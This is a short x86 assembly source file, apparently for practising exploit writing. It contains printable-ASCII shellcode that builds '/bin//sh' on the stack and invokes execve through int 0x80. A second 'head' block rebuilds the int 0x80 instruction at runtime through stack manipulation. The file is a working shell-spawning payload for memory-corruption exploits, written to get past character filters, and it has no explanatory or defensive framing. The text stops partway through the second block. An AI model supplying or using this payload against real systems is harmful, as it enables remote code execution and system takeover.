.globl _start

_start:
	//gcc -o sc ascii.s -m32 -nostdlib -Wl,--omagic
	push	$0x30
	pop	%eax
	xor	$0x30, %al
	push	%eax
	push	$0x68732f2f
	push	$0x6e69622f
	push	%esp
	pop	%ebx
	push	%eax
	push	%ebx
	push	%esp
	pop	%ecx
	push	%eax
	pop	%edx
	push	$0x3b
	pop	%eax
	xor	$0x30, %al
	int	$0x80

head:
	dec	%esp
	dec	%esp
	dec	%esp
	dec	%esp
	pop	%eax
	//%eax = 0x80000000

	//cd 80 position + 4
	xor	$0x3f, %al
	push	%eax
	pop	%esp
	//%esp = 0x8000001e
	push	$0x30
	pop	%eax
	xor	$0x30, %al
	//%eax = 0
	sub	$0x20207f33, %eax
	//%eax = 0xdfdfcd80
	push	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	pop	%eax
	//adjust stack
